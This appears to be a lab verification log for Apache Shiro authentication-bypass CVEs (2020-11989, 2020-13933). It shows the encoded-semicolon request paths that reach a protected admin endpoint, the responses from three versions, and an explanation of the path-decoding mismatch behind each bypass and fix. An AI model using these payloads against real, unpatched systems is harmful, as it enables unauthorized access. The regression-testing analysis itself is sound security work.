------------------------------------------------------------------- raw HTTP evidence
CONTROL — plain unauth GET /admin/flag (must be gated on ALL versions):
  V0: HTTP/1.1 302   (Shiro authc -> redirect /login, no flag)
  V1: HTTP/1.1 302
  V2: HTTP/1.1 302

ORIGINAL — CVE-2020-11989, DOUBLE-encoded semicolon  GET /admin/%253bflag
  V0: HTTP/1.1 200   body: ADMIN-FLAG:PCBFLAG_045cb8feac140ad4dcfcdaa326b3e1ef (name=%3bflag)   <- REACHED (bypass)
  V1: HTTP/1.1 302   body: (empty)                                                                <- BLOCKED (11989 fix)
  V2: HTTP/1.1 302   body: (empty)                                                                <- BLOCKED

RESIDUAL — CVE-2020-13933, SINGLE-encoded semicolon  GET /admin/%3bflag
  V0: HTTP/1.1 200   body: ADMIN-FLAG:...(name=;flag)    <- REACHED
  V1: HTTP/1.1 200   body: ADMIN-FLAG:PCBFLAG_045cb8feac140ad4dcfcdaa326b3e1ef (name=;flag)   <- REACHED (residual bypass; 11989 fix MISSED it)
  V2: HTTP/1.1 400   body: {"status":400,"error":"Bad Request","path":"/admin/%3Bflag"}       <- BLOCKED (InvalidRequestFilter rejects %3b)

=====================================================================================
WHY (mechanism, empirically confirmed)
=====================================================================================
Tomcat single-decodes the raw URI into servletPath; Spring binds /admin/{name} on the
per-segment matrix-stripped path; Shiro uses WebUtils.getPathWithinApplication.

ORIGINAL /admin/%253bflag :
  Tomcat servletPath = /admin/%3bflag  (%25 -> %, so a LITERAL "%3b", not ';')
  V0 (1.5.2) getPathWithinApplication DOUBLE-decodes (SHIRO-753 regression): %3b -> ';',
     then cuts at first ';' -> /admin/ -> /admin  =>  /admin/* NOT matched -> authc SKIPPED
     Spring binds /admin/{name} (name=%3bflag) -> FLAG.                       => V0 REACHES
  V1 (1.5.3) removed the 2nd decode: '%3b' stays literal, path stays /admin/%3bflag
     => matches /admin/* -> authc -> 302.                                     => V1 BLOCKED

RESIDUAL /admin/%3bflag :
  Tomcat servletPath = /admin/;flag  (single decode -> real ';')
  V1 (1.5.3) removeSemicolon() cuts from first ';' -> /admin/ -> /admin
     => /admin/* NOT matched -> authc SKIPPED ; Spring binds /admin/{name} -> FLAG. => V1 REACHES
  V2 (1.6.0) global InvalidRequestFilter checks the RAW URI, finds "%3b" -> HTTP 400. => V2 BLOCKED

